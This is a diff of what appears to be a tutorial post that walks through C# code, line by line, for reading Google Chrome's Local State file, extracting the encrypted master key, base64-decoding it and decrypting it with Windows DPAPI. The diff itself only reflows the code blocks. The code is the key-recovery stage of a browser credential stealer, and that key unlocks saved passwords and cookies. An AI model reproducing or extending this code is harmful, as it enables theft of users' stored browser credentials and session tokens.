@@ -710,19 +710,24 @@ Obtaining and decrypting the key:
     string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Local State");[/CODE] Specifies the path to the file with the key
 [CODE]
 
-    string localStateData = File.ReadAllText(localStatePath); [/CODE] Reads data from a file
+    string localStateData = File.ReadAllText(localStatePath); 
+[/CODE] Reads data from a file
 [CODE]
 
-    dynamic json = JObject.Parse(localStateData); [/CODE] Converts file contents to json
+    dynamic json = JObject.Parse(localStateData); 
+[/CODE] Converts file contents to json
 [CODE]
 
-    string encryptedKeyBase64 = json.os_crypt.encrypted_key; [/CODE] Searches for a key by encrypted_key
+    string encryptedKeyBase64 = json.os_crypt.encrypted_key; 
+[/CODE] Searches for a key by encrypted_key
 [CODE]
 
-    byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64); [/CODE] Decodes a key from base64 into bytes
+    byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64); 
+[/CODE] Decodes a key from base64 into bytes
 [CODE]
 
-    byte[] trimmedKey = encryptedKey.Skip(5).ToArray(); [/CODE] Removes first 5 bytes
+    byte[] trimmedKey = encryptedKey.Skip(5).ToArray(); 
+[/CODE] Removes first 5 bytes
 [CODE]
 
     byte[] decryptedKey = ProtectedData.Unprotect(trimmedKey, null, DataProtectionScope.CurrentUser);
